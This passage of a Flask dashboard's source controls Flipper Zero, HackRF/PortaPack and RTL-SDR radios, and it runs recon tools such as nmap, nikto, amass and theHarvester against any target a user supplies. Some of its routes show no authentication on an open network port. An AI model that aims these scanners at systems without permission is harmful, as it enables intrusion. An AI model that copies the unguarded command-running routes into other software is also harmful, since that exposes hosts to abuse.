}
setInterval(()=>{
  const t=document.getElementById('left-flipper');
  if(t && t.classList.contains('active')) fzStatus();
}, 6000);

function fzRun(cmd, seconds){
  const title='FLIPPER'+(seconds?' — '+seconds+'s capture':'');
  ppInfo(title, '> '+cmd+(seconds?'\n(listening '+seconds+'s…)':''));
  return ppApi('/api/fz/cmd',{cmd:cmd, seconds:seconds||0}).then(d=>{
    ppInfo(title, d.ok ? ('> '+cmd+'\n'+d.output+(d.saved?'\n\nSaved → FILES '+d.saved:'')) : ('Error: '+d.error), !d.ok);
    fzStatus();
    return d;
  }).catch(e=>ppInfo(title,'Error: '+e,true));
}
function fzSend(c){
  const cmd=(c!==undefined)?c:_v('fz-cmd');
  if(!cmd) return;
  fzRun(cmd, 0);
}
function fzTimed(c){ fzRun(c, parseInt(_v('fz-secs'))||20); }
function fzSubRx(){
  const mhz=parseFloat(_v('fz-freq'));
  if(!(mhz>=280 && mhz<=930)){ ppInfo('FLIPPER','Frequency must be 280–930 MHz (CC1101 bands)',true); return; }
  fzTimed('subghz rx '+Math.round(mhz*1e6));
}
function fzOpenApp(){
  const a=_v('fz-app'); if(!a) return;
  fzSend('loader open "'+a.replace(/"/g,'')+'"');
}
function fzFind(){
  fzSend('vibro 1');
  setTimeout(()=>fzSend('vibro 0'), 1500);
}
function fzLs(path){
  const box=document.getElementById('fz-ls'); if(!box) return;
  box.textContent='loading '+path+'…';
  ppApi('/api/fz/ls?path='+encodeURIComponent(path)).then(d=>{
    if(!d.ok){ box.innerHTML='<span style="color:var(--xred)">'+escapeHtml(d.error)+'</span>'; return; }
    let h='<div style="margin-bottom:4px;color:var(--sec)">'+escapeHtml(d.path)+'</div>';
    const up=d.path.replace(/\/[^/]*$/,'');
    if(up && up!=='' && d.path!=='/ext' && d.path!=='/int')
      h+='<div style="cursor:pointer" onclick="fzLs(\''+escapeHtml(up)+'\')">⬆ ..</div>';
    d.items.forEach(it=>{
      const full=(d.path+'/'+it.name).replace(/'/g,"\\'");
      if(it.dir) h+='<div style="cursor:pointer" onclick="fzLs(\''+escapeHtml(full)+'\')">📁 '+escapeHtml(it.name)+'</div>';
      else h+='<div style="display:flex;gap:6px;align-items:center"><span style="flex:1;word-break:break-all">📄 '+escapeHtml(it.name)+
             ' <span style="color:var(--border)">'+(it.size!=null?it.size+'b':'')+'</span></span>'+
             '<button class="tool-btn" style="width:auto;margin:0;padding:2px 6px" onclick="fzPull(\''+escapeHtml(full)+'\')">⬇</button></div>';
    });
    if(!d.items.length) h+='<div>(empty)</div>';
    box.innerHTML=h;
  }).catch(e=>{ box.textContent='Error: '+e; });
}
function fzPull(path){
  ppInfo('FLIPPER PULL','Copying '+path+' …');
  ppApi('/api/fz/pull',{path:path}).then(d=>{
    ppInfo('FLIPPER PULL', d.ok ? ('Saved '+d.bytes+' bytes → FILES '+d.saved) : ('Error: '+d.error), !d.ok);
  }).catch(e=>ppInfo('FLIPPER PULL','Error: '+e,true));
}

// ════════ v12: PortaPack H4M / HackRF over USB-C + MDK GPS ════════
var _ppMode='none', _ppMirrorOn=false, _ppBusy=false, _hrfES=null;   // var: setLiveTab may read these early

function ppApi(path, body){
  const opt = (body===undefined)
    ? {headers:{'X-API-Key':TR_KEY}}
    : {method:'POST', headers:{'X-API-Key':TR_KEY,'Content-Type':'application/json'}, body:JSON.stringify(body)};
  return fetch(path, opt).then(r=>r.json());
}
// Results land in the TOOL REFERENCE box under the live panel (always visible).
function ppInfo(title, text, isErr){
  const box=document.getElementById('tool-info'); if(!box) return;
  box.innerHTML='<div style="color:var(--red);font-size:1.05em;letter-spacing:.08em;margin-bottom:6px">'+escapeHtml(title)+'</div>'+
    '<pre style="white-space:pre-wrap;word-break:break-word;font-family:monospace;font-size:.9em;color:'+(isErr?'var(--xred)':'var(--sec)')+'">'+escapeHtml(text||'')+'</pre>';
}
function _v(id){ const e=document.getElementById(id); return e?e.value.trim():''; }

function ppStatus(){
  fetch('/api/pp/status').then(r=>r.json()).then(d=>{
    _ppMode=d.mode;
    const el=document.getElementById('pp-state'); if(!el) return;
    const label={mayhem:'● MAYHEM MODE — remote control ready',
                 hackrf:'● SDR MODE — '+(d.product||'HackRF')+' ready',
                 none:'○ Not detected — plug its USB-C into the hub and power it on'}[d.mode]||d.mode;
    el.innerHTML='<span style="color:'+(d.mode==='none'?'var(--dim)':'#cc2222')+'">'+escapeHtml(label)+'</span>'+
      (d.port?'<br>console: '+escapeHtml(d.port):'')+(d.live?'<br>live sweep running':'');
  }).catch(()=>{});
  gpsStatus();
}
function gpsStatus(){
  fetch('/api/gps/status').then(r=>r.json()).then(d=>{
    const el=document.getElementById('mdk-gps'); if(!el) return;
    const devs=d.devices||[], mdk=devs.find(x=>(x.path||'').startsWith('udp://'));
    let h;
    if(!d.gpsd) h='<span style="color:var(--xred)">gpsd not reachable — re-run the installer</span>';
    else if(!mdk) h='MDK feed: <span style="color:var(--xred)">not set up in gpsd — re-run the installer</span>';
    else if(mdk.driver) h='MDK feed: <span style="color:#cc2222">receiving ('+escapeHtml(mdk.driver)+')</span>';
    else h='MDK feed: listening on UDP '+d.port+' — no data yet';
    h+='<br>Fix: '+(d.fix?((d.fix.mode===3?'3D ':'2D ')+d.fix.lat+', '+d.fix.lon+' via '+escapeHtml(d.fix.source)):'none yet');
    devs.filter(x=>!(x.path||'').startsWith('udp://')).forEach(x=>{
      h+='<br>Also: '+escapeHtml(x.path)+(x.driver?' ('+escapeHtml(x.driver)+')':'');
    });
    el.innerHTML=h;
  }).catch(()=>{});
}
setInterval(()=>{
  const t=document.getElementById('left-portapack');
  if(t && t.classList.contains('active')) ppStatus();
}, 5000);

function ppMode(m){
  ppMirror(false);
  if(m==='mayhem') hrfLiveStop(true);
  ppInfo('PORTAPACK', m==='hackrf' ? 'Switching to SDR mode…' : 'Rebooting into Mayhem… (takes a few seconds)');
  ppApi('/api/pp/mode',{mode:m}).then(d=>{
    ppInfo('PORTAPACK', d.ok ? (d.msg||'Done') : ('Error: '+d.error), !d.ok);
    ppStatus();
  }).catch(e=>ppInfo('PORTAPACK','Error: '+e,true));
}

// ---- Screen mirror (screenframeshort: 1 char/pixel, 0b00RRGGBB + 32) ----
function ppMirror(on){
  if(on===undefined) on=!_ppMirrorOn;
  _ppMirrorOn=on;
  const b=document.getElementById('pp-mirror-btn'); if(b) b.textContent=on?'■ STOP':'▶ MIRROR';
  const l=document.getElementById('pp-mirror-left'); if(l) l.textContent=on?'Stop mirroring':'Mirror screen';
  if(on){ setLiveTab('ppscreen'); ppFrame(true); }
}
function ppFrame(force){
  if((!_ppMirrorOn && !force) || _ppBusy) return;
  _ppBusy=true;
  const t0=Date.now(), info=document.getElementById('pp-screen-info');
  ppApi('/api/pp/screen').then(d=>{
    _ppBusy=false;
    if(!d.ok){ if(info) info.textContent=d.error; ppMirror(false); return; }
    ppDraw(d);
    if(info) info.textContent=d.w+'×'+d.h+' · '+(Date.now()-t0)+' ms';
    if(_ppMirrorOn) setTimeout(()=>ppFrame(), 600);
  }).catch(()=>{ _ppBusy=false; if(_ppMirrorOn) setTimeout(()=>ppFrame(), 2000); });
}
function ppDraw(d){
  const c=document.getElementById('pp-canvas'); if(!c) return;
  if(c.width!==d.w) c.width=d.w;
  if(c.height!==d.h) c.height=d.h;
  const ctx=c.getContext('2d'), img=ctx.createImageData(d.w,d.h), px=img.data;
  let o=0;
  for(const row of d.rows){
    for(let i=0;i<d.w;i++){
      const v=(row.charCodeAt(i)||32)-32;
      px[o]=((v>>4)&3)*85; px[o+1]=((v>>2)&3)*85; px[o+2]=(v&3)*85; px[o+3]=255; o+=4;
    }
  }
  ctx.putImageData(img,0,0);
}
(function(){
  const c=document.getElementById('pp-canvas'); if(!c) return;
  c.addEventListener('click', ev=>{
    const r=c.getBoundingClientRect();
    const x=Math.max(1,Math.min(c.width-1, Math.round((ev.clientX-r.left)*c.width/r.width)));
    const y=Math.max(1,Math.min(c.height-1, Math.round((ev.clientY-r.top)*c.height/r.height)));
    ppApi('/api/pp/touch',{x,y}).then(d=>{
      if(!d.ok) ppInfo('PORTAPACK','Touch failed: '+d.error,true);
      setTimeout(()=>ppFrame(true),250);
    });
  });
})();
function ppBtn(name){
  ppApi('/api/pp/button',{button:name}).then(d=>{
    if(!d.ok) ppInfo('PORTAPACK','Button failed: '+d.error,true);
    setTimeout(()=>ppFrame(true),200);
  }).catch(e=>ppInfo('PORTAPACK','Error: '+e,true));
}
function ppScreenshot(){
  ppInfo('PORTAPACK SCREENSHOT','Grabbing a full-colour frame…');
  ppApi('/api/pp/screenshot',{}).then(d=>{
    ppInfo('PORTAPACK SCREENSHOT', d.ok ? ('Saved '+d.w+'×'+d.h+' PNG:\n'+d.saved+'\n(FILES → portapack)') : ('Error: '+d.error), !d.ok);
  }).catch(e=>ppInfo('PORTAPACK SCREENSHOT','Error: '+e,true));
}
function ppRtcSync(){
  ppApi('/api/pp/rtcsync',{}).then(d=>{
    ppInfo('PORTAPACK CLOCK', d.ok ? d.output : ('Error: '+d.error), !d.ok);
  }).catch(e=>ppInfo('PORTAPACK CLOCK','Error: '+e,true));
}
function ppLoadApps(){
  const sel=document.getElementById('pp-apps'); if(!sel) return;
  sel.innerHTML='<option value="">loading…</option>';
  ppApi('/api/pp/apps').then(d=>{
    if(!d.ok){ sel.innerHTML='<option value="">— not in Mayhem mode —</option>'; ppInfo('PORTAPACK APPS','Error: '+d.error,true); return; }
    sel.innerHTML='<option value="">— pick an app ('+d.apps.length+') —</option>';
    d.apps.forEach(a=>{ const o=document.createElement('option'); o.value=a.id; o.textContent=a.label; sel.appendChild(o); });
  }).catch(e=>ppInfo('PORTAPACK APPS','Error: '+e,true));
}
function ppStartApp(){
  const id=_v('pp-apps');
  if(!id){ ppInfo('PORTAPACK APPS','Load the app list (🔄) and pick one first.',true); return; }
  ppApi('/api/pp/appstart',{app:id}).then(d=>{
    ppInfo('PORTAPACK APPS', d.ok ? d.output : ('Error: '+d.error), !d.ok);
    setTimeout(()=>ppFrame(true),400);
  }).catch(e=>ppInfo('PORTAPACK APPS','Error: '+e,true));
}
function ppSend(cmd){
  cmd = cmd || _v('pp-cmd');
  if(!cmd) return;
  ppInfo('ch> '+cmd,'…');
  ppApi('/api/pp/cmd',{cmd}).then(d=>{
    ppInfo('ch> '+cmd, d.ok ? d.output : ('Error: '+d.error), !d.ok);
  }).catch(e=>ppInfo('ch> '+cmd,'Error: '+e,true));
}

// ---- HackRF: one-shot sweep, live waterfall, IQ capture, rtl_433 ----
function hrfParams(){
  return {start:parseInt(_v('hrf-start'),10)||1, stop:parseInt(_v('hrf-stop'),10)||6000,
          amp:(document.getElementById('hrf-amp')||{}).checked?1:0};
}
function hrfPreset(a,b){
  document.getElementById('hrf-start').value=a;
  document.getElementById('hrf-stop').value=b;
  hrfSweep();
}
function hrfSweep(){
  const p=hrfParams();
  hrfLiveStop(true);
  setLiveTab('spectrum');
  ppInfo('HACKRF SWEEP','Sweeping '+p.start+'–'+p.stop+' MHz…');
  ppApi('/api/hackrf/sweep',p).then(d=>{
    if(!d.ok){ ppInfo('HACKRF SWEEP','Error: '+d.error+(d.detail?'\n\n'+d.detail:''),true); return; }
    drawSpectrum(d.points, 'HackRF '+p.start+'–'+p.stop+' MHz');
    let t='Saved: '+d.saved+'\nBin width: '+(d.bin_hz/1000)+' kHz   GPS: '+
      (d.gps ? d.gps.lat+', '+d.gps.lon+' ('+d.gps.source+')' : 'no fix')+'\n\nStrongest signals:\n';
    (d.peaks||[]).forEach(k=>{ t+='  '+k[0].toFixed(3)+' MHz   '+k[1].toFixed(1)+' dB\n'; });
    ppInfo('HACKRF SWEEP', t);
  }).catch(e=>ppInfo('HACKRF SWEEP','Error: '+e,true));
}
function hrfLive(){
  const p=hrfParams();
  if(_hrfES){ _hrfES.close(); _hrfES=null; }   // server swaps the sweep range itself
  setLiveTab('spectrum'); wfReset();
  ppInfo('HACKRF LIVE','Live sweep '+p.start+'–'+p.stop+' MHz. Spectrum on top, waterfall below. ■ stops it.');
  _hrfES=new EventSource('/api/hackrf/live?k='+encodeURIComponent(TR_KEY)+'&start='+p.start+'&stop='+p.stop+'&amp='+p.amp);
  _hrfES.onmessage=e=>{
    try{
      const d=JSON.parse(e.data);
      drawSpectrum(d.f.map((f,i)=>[f,d.p[i]]), 'LIVE '+p.start+'–'+p.stop+' MHz');
      wfPush(d.p);
    }catch(x){}
  };
  _hrfES.addEventListener('fail', e=>{
    let m=e.data; try{ m=JSON.parse(e.data); }catch(x){}
    if(_hrfES){ _hrfES.close(); _hrfES=null; }
    ppInfo('HACKRF LIVE','Stopped: '+m,true);
  });
  _hrfES.onerror=()=>{ if(_hrfES && _hrfES.readyState===2){ _hrfES=null; ppInfo('HACKRF LIVE','Stream closed — check SDR mode and try again.',true); } };
}
function hrfLiveStop(quiet){
  const was=!!_hrfES;
  if(_hrfES){ _hrfES.close(); _hrfES=null; }
  if(quiet && !was) return;
  ppApi('/api/hackrf/live/stop',{}).catch(()=>{});
  if(!quiet) ppInfo('HACKRF LIVE','Live sweep stopped.');
}
function hrfIQ(){
  const body={freq:parseFloat(_v('iq-freq')), secs:parseFloat(_v('iq-secs')), rate:parseInt(_v('iq-rate'),10),
              amp:(document.getElementById('hrf-amp')||{}).checked?1:0};
  hrfLiveStop(true);
  ppInfo('HACKRF IQ','Recording '+body.secs+' s at '+body.freq+' MHz ('+body.rate+' Msps)…');
  ppApi('/api/hackrf/iq',body).then(d=>{
    ppInfo('HACKRF IQ', d.ok ? ('Saved '+d.size_mb+' MB:\n'+d.saved+'\nGPS: '+(d.gps?d.gps.lat+', '+d.gps.lon+' ('+d.gps.source+')':'no fix'))
                             : ('Error: '+d.error+(d.detail?'\n\n'+d.detail:'')), !d.ok);
  }).catch(e=>ppInfo('HACKRF IQ','Error: '+e,true));
}
function ismDecode(){
  const freq=_v('ism-freq')||'433.92M';
  hrfLiveStop(true);
  ppInfo('rtl_433 '+freq,'Listening for 30 s…');
  ppApi('/api/sdr/ism',{freq, secs:30}).then(d=>{
    if(!d.ok){ ppInfo('rtl_433 '+freq,'Error: '+d.error,true); return; }
    ppInfo('rtl_433 '+freq+' on '+d.radio, d.messages+' message(s) decoded'+(d.saved?'\nSaved: '+d.saved:'')+'\n\n'+(d.output||''));
  }).catch(e=>ppInfo('rtl_433 '+freq,'Error: '+e,true));
}

// ---- Spectrum + waterfall canvases (theme-aware: reads --red) ----
function _themeRed(){ return (getComputedStyle(document.documentElement).getPropertyValue('--red')||'#ff2222').trim(); }
function _fitCanvas(c){
  const w=Math.max(200, Math.floor(c.clientWidth||600)), h=Math.max(80, Math.floor(c.clientHeight||200));
  if(c.width!==w || c.height!==h){ c.width=w; c.height=h; return true; }
  return false;
}
function drawSpectrum(points, label){
  const c=document.getElementById('spec-canvas'); if(!c || !points || !points.length) return;
  _fitCanvas(c);
  const ctx=c.getContext('2d'), W=c.width, H=c.height, red=_themeRed();
  const f0=points[0][0], f1=points[points.length-1][0];
  let mn=Infinity, mx=-Infinity;
  points.forEach(p=>{ if(p[1]<mn) mn=p[1]; if(p[1]>mx) mx=p[1]; });
  mn=Math.floor(mn/10)*10; mx=Math.ceil(mx/10)*10; if(mx-mn<20) mx=mn+20;
  ctx.fillStyle='#000'; ctx.fillRect(0,0,W,H);
  ctx.strokeStyle='#2a0000'; ctx.fillStyle='#884444'; ctx.font='10px monospace'; ctx.lineWidth=1;
  for(let i=0;i<=4;i++){
    const y=Math.round(i*(H-14)/4)+0.5;
    ctx.beginPath(); ctx.moveTo(0,y); ctx.lineTo(W,y); ctx.stroke();
    ctx.fillText((mx-i*(mx-mn)/4).toFixed(0)+' dB',2,Math.min(H-16,y+10));
    const x=Math.round(i*(W-1)/4)+0.5;
    ctx.beginPath(); ctx.moveTo(x,0); ctx.lineTo(x,H-14); ctx.stroke();
    const fl=(f0+i*(f1-f0)/4); ctx.fillText(fl.toFixed(fl<100?2:1), Math.min(W-48,Math.max(0,x-20)), H-3);
  }
  ctx.strokeStyle=red; ctx.lineWidth=1.2; ctx.beginPath();
  points.forEach((p,i)=>{
    const x=(f1>f0)?(p[0]-f0)/(f1-f0)*(W-1):i, y=(1-(p[1]-mn)/(mx-mn))*(H-14);
    if(i) ctx.lineTo(x,y); else ctx.moveTo(x,y);
  });
  ctx.stroke();
  const pk=points.reduce((a,b)=>a[1]>b[1]?a:b);
  const info=document.getElementById('spec-info');
  if(info) info.textContent=(label||'')+' · peak '+pk[0].toFixed(3)+' MHz @ '+pk[1].toFixed(1)+' dB';
}
let _wfMin=null, _wfMax=null;
function wfReset(){
  const c=document.getElementById('wf-canvas'); if(!c) return;
  _fitCanvas(c);
  const ctx=c.getContext('2d'); ctx.fillStyle='#000'; ctx.fillRect(0,0,c.width,c.height);
  _wfMin=null; _wfMax=null;
}
function _wfColor(t){   // black → dark red → red → orange → white-hot
  if(t<0.35) return [Math.round(t/0.35*150),0,0];
  if(t<0.7)  return [150+Math.round((t-0.35)/0.35*105), Math.round((t-0.35)/0.35*70), 0];
  if(t<0.92) return [255, 70+Math.round((t-0.7)/0.22*170), 0];
  return [255, 240, Math.round((t-0.92)/0.08*255)];
}
function wfPush(p){
  const c=document.getElementById('wf-canvas'); if(!c || !p || !p.length) return;
  if(_fitCanvas(c)) wfReset();
  const ctx=c.getContext('2d'), W=c.width, H=c.height;
  let mn=Infinity, mx=-Infinity; p.forEach(v=>{ if(v<mn) mn=v; if(v>mx) mx=v; });
  _wfMin=(_wfMin===null)?mn:_wfMin*0.9+mn*0.1;
  _wfMax=(_wfMax===null)?mx:_wfMax*0.9+mx*0.1;
  const span=Math.max(10,_wfMax-_wfMin);
  ctx.drawImage(c,0,0,W,H-1,0,1,W,H-1);
  const row=ctx.createImageData(W,1);
  for(let x=0;x<W;x++){
    const v=p[Math.min(p.length-1, Math.floor(x*p.length/W))];
    const rgb=_wfColor(Math.max(0,Math.min(1,(v-_wfMin)/span)));
    row.data[x*4]=rgb[0]; row.data[x*4+1]=rgb[1]; row.data[x*4+2]=rgb[2]; row.data[x*4+3]=255;
  }
  ctx.putImageData(row,0,0);
}
</script>
</body>
</html>'''



# ── OSINT Routes ─────────────────────────────────────────────────────────────
@app.route('/api/osint', methods=['POST'])
def osint_run():
    data = request.json or {}
    tool = data.get('tool')
    target = data.get('target', '').strip()
    if not target and tool not in ('myip','recon-ng'):
        return jsonify({'output': 'Error: No target specified'})
    
    cmds = {
        'whois':      ['whois', target],
        'dig':        ['dig', target, 'ANY', '+short'],
        'traceroute': ['traceroute', '-m', '15', target],
        'nmap':       ['nmap', '-sV', '-T4', '--open', target],
        'sslscan':    ['sslscan', '--no-colour', target],
        'whatweb':    ['whatweb', '-v', target],
        'wafw00f':    ['wafw00f', target],
        'nikto':      ['nikto', '-h', target, '-maxtime', '60'],
        'subfinder':  ['subfinder', '-d', target, '-silent'],
        'fierce':     ['fierce', '--domain', target],
        'amass':      ['amass', 'enum', '-passive', '-d', target],
        'harvester':  ['theharvester', '-d', target, '-b', 'bing,duckduckgo,google'],
        'sherlock':   ['sherlock', target, '--timeout', '10'],
        'exiftool':   ['exiftool', target],
        'myip':       ['curl', '-s', 'https://ipinfo.io/ip'],
        'recon-ng':   ['recon-ng', '--no-check'],
    }
    
    if tool not in cmds:
        return jsonify({'output': f'Unknown tool: {tool}'})
    
    try:
        timeout = 120 if tool in ('nikto','amass','harvester','sherlock') else 30
        result = subprocess.run(
            cmds[tool], capture_output=True, text=True, timeout=timeout
        )
        output = result.stdout or result.stderr or 'No output'
        log(f'OSINT {tool}: {target}')
        return jsonify({'output': output[:5000]})
    except subprocess.TimeoutExpired:
        return jsonify({'output': f'{tool} timed out after {timeout}s'})
    except FileNotFoundError:
        return jsonify({'output': f'Error: {tool} not found'})
    except Exception as e:
        return jsonify({'output': f'Error: {str(e)}'})

# ── Live Feed Routes ─────────────────────────────────────────────────────────
@app.route('/api/live/netinfo')
def live_network():
    import subprocess
    try:
        # Active connections
        conns = subprocess.run(['ss','-tnp'], capture_output=True, text=True).stdout
        conn_lines = [l for l in conns.strip().split('\n')[1:] if 'ESTAB' in l][:8]
        
        # Interface stats
        ifaces = subprocess.run(['ip','-s','link','show'], capture_output=True, text=True).stdout
        
        # ARP table
        arp = subprocess.run(['arp','-n'], capture_output=True, text=True).stdout
        arp_lines = [l for l in arp.strip().split('\n')[1:] if 'ether' in l][:8]
        
        # GPS — enable the stream, then POLL for the current fix. POLL returns
        # the latest TPV immediately instead of waiting for the stream to cycle.
        try:
            import socket
            s = socket.socket()
            s.settimeout(3)
            s.connect(('localhost', 2947))
            s.send(b'?WATCH={"enable":true,"json":true};\n')
            gps_data = ''
            deadline = _time.time() + 3.0
            polled = False
            while _time.time() < deadline:
                # once the headers are in, ask for the current fix directly
                if not polled and '"class":"WATCH"' in gps_data:
                    s.send(b'?POLL;\n')
                    polled = True
                try:
                    chunk = s.recv(8192).decode(errors='ignore')
                except socket.timeout:
                    break
                if not chunk:
                    break
                gps_data += chunk
                # TPV = streamed fix, POLL = the polled response (has tpv[])
                if '"class":"TPV"' in gps_data or '"class":"POLL"' in gps_data:
                    break
            s.close()
        except Exception:
            gps_data = ''
        
        # Interface IPs
        ip_out = subprocess.run(['ip','addr','show'], capture_output=True, text=True).stdout
        iface_info = []
        current = None
        for line in ip_out.split('\n'):
            if ': ' in line and not line.startswith(' '):
                parts = line.split(': ')
                if len(parts) >= 2:
                    current = parts[1].split('@')[0]
            if 'inet ' in line and current:
                ip = line.strip().split()[1]
                iface_info.append(f"{current}: {ip}")
        
        return jsonify({
            'connections': conn_lines,
            'interfaces': iface_info[:8],
            'arp': arp_lines,
            'gps_raw': gps_data[:4000],
        })
    except Exception as e:
        return jsonify({'error': str(e)})

# ── SDR Routes ────────────────────────────────────────────────────────────────
import threading, time, json

sdr_state = {'running': False, 'mode': None, 'proc': None, 'data': []}

@app.route('/api/sdr/status')
def sdr_status():
    detected = _sdr_present()
    return jsonify({'detected': detected, 'running': sdr_state['running'], 'mode': sdr_state['mode']})

@app.route('/api/sdr/scan', methods=['POST'])
def sdr_scan():
    data = request.json or {}
    start = data.get('start_freq', '88M')
    stop  = data.get('stop_freq',  '108M')
    step  = data.get('bin_size',   '200k')
    try:
        import tempfile, os
        # Kill any existing SDR processes first
        subprocess.run(['pkill','-f','rtl_adsb'], capture_output=True)
        subprocess.run(['pkill','-f','rtl_fm'],   capture_output=True)
        subprocess.run(['pkill','-f','rtl_tcp'],  capture_output=True)
        import time; time.sleep(0.5)
        # Use temp file — rtl_power doesn't reliably stream to stdout
        tmp = '/tmp/sdr_scan.csv'
        if os.path.exists(tmp): os.remove(tmp)
        result = subprocess.run(
            ['rtl_power', '-f', f'{start}:{stop}:{step}', '-g', '40', '-i', '1', '-e', '4s', tmp],
            capture_output=True, text=True, timeout=20
        )
        points = []
        if os.path.exists(tmp):
            with open(tmp) as f:
                for line in f:
                    parts = line.strip().split(',')
                    if len(parts) > 6:
                        try:
                            freq_start = float(parts[2])
                            freq_step  = float(parts[4])
                            vals = parts[6:]
                            for i, v in enumerate(vals):
                                points.append({'freq': round((freq_start + i*freq_step)/1e6, 3), 'power': float(v.strip())})
                        except: pass
        if not points:
            return jsonify({'ok': False, 'error': 'No data captured — is the dongle connected?'})
        log(f'SDR scan: {start}-{stop} — {len(points)} points')
        return jsonify({'ok': True, 'points': points})
    except subprocess.TimeoutExpired:
        return jsonify({'ok': False, 'error': 'Scan timeout'})
    except Exception as e:
        return jsonify({'ok': False, 'error': str(e)})

@app.route('/api/sdr/fm', methods=['POST'])
def sdr_fm():
    data = request.json or {}
    freq = data.get('freq', '104.3M')
    action = data.get('action', 'start')
    if action == 'stop':
        if sdr_state['proc']:
            sdr_state['proc'].terminate()
            sdr_state['proc'] = None
        sdr_state['running'] = False
        sdr_state['mode'] = None
        return jsonify({'ok': True, 'msg': 'FM stopped'})
    try:
        subprocess.run(['pkill','-f','rtl_adsb'], capture_output=True)
        subprocess.run(['pkill','-f','rtl_fm'],   capture_output=True)
        subprocess.run(['pkill','-f','rtl_tcp'],  capture_output=True)
        import time; time.sleep(0.5)
        if sdr_state['proc']:
            sdr_state['proc'].terminate()
        # Convert freq to Hz
        freq_hz = freq.strip()  # rtl_fm accepts suffixes like 104.3M as-is
        proc = subprocess.Popen(
            ['rtl_fm', '-f', freq_hz, '-M', 'wbfm', '-s', '200000', '-r', '44100', '-'],
            stdout=subprocess.PIPE, stderr=subprocess.DEVNULL
        )
        sdr_state['proc'] = proc
        sdr_state['running'] = True
        sdr_state['mode'] = 'fm'
        sdr_state['freq'] = freq
        log(f'SDR FM: {freq}')
        return jsonify({'ok': True, 'msg': f'FM decoding {freq}', 'stream': '/api/sdr/stream'})
    except Exception as e:
        return jsonify({'ok': False, 'error': str(e)})

@app.route('/api/sdr/stream')
def sdr_stream():
    """Stream raw PCM audio from rtl_fm as WAV"""
    def generate():
        # WAV header for 44100Hz 16-bit mono
        import struct
        sr, bits, ch = 44100, 16, 1
        # Write WAV header (streaming so set size to max)
        header = struct.pack('<4sI4s4sIHHIIHH4sI',
            b'RIFF', 0xFFFFFFFF, b'WAVE',
            b'fmt ', 16, 1, ch, sr, sr*ch*bits//8, ch*bits//8, bits,
            b'data', 0xFFFFFFFF)
        yield header
        proc = sdr_state.get('proc')
        if proc and proc.stdout:
            while sdr_state['running']:
                chunk = proc.stdout.read(4096)
                if not chunk:
                    break
                yield chunk
    from flask import Response, stream_with_context
    return Response(stream_with_context(generate()),
                    mimetype='audio/wav',
                    headers={'Cache-Control': 'no-cache',
                             'X-Accel-Buffering': 'no'})

@app.route('/api/sdr/adsb', methods=['POST'])
def sdr_adsb():
    data = request.json or {}
    action = data.get('action', 'start')
    if action == 'stop':
        if sdr_state['proc']:
            sdr_state['proc'].terminate()
            sdr_state['proc'] = None
        sdr_state['running'] = False
        sdr_state['mode'] = None
        return jsonify({'ok': True, 'msg': 'ADS-B stopped'})
    try:
        if sdr_state['proc']:
            sdr_state['proc'].terminate()
        # Start dump1090 if available, else rtl_adsb
        dump = subprocess.run(['which','dump1090'], capture_output=True, text=True).stdout.strip()
        if dump:
            hp = subprocess.run([dump, '--help'], capture_output=True, text=True, timeout=5)
            has_http = 'net-http-port' in (hp.stdout + hp.stderr)
            args = [dump, '--net'] + (['--net-http-port', '8090'] if has_http else [])
            proc = subprocess.Popen(args, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            msg = 'dump1090 started, SBS on :30003' + (', map on :8090' if has_http else '')
        else:
            proc = subprocess.Popen(['rtl_adsb', '-V'],
                stdout=subprocess.PIPE, stderr=subprocess.DEVNULL)
            msg = 'rtl_adsb started'
        sdr_state['proc'] = proc
        sdr_state['running'] = True
        sdr_state['mode'] = 'adsb'
        log('SDR ADS-B: tracking aircraft')
        return jsonify({'ok': True, 'msg': msg})
    except Exception as e:
        return jsonify({'ok': False, 'error': str(e)})

@app.route('/api/sdr/stop', methods=['POST'])
def sdr_stop():
    if sdr_state['proc']:
        sdr_state['proc'].terminate()
        sdr_state['proc'] = None
    sdr_state['running'] = False
    sdr_state['mode'] = None
    return jsonify({'ok': True})

if __name__ == '__main__':
    init_dirs()
    log('Dashboard v17 started')
    app.run(host='0.0.0.0', port=8080, debug=False, use_reloader=False)
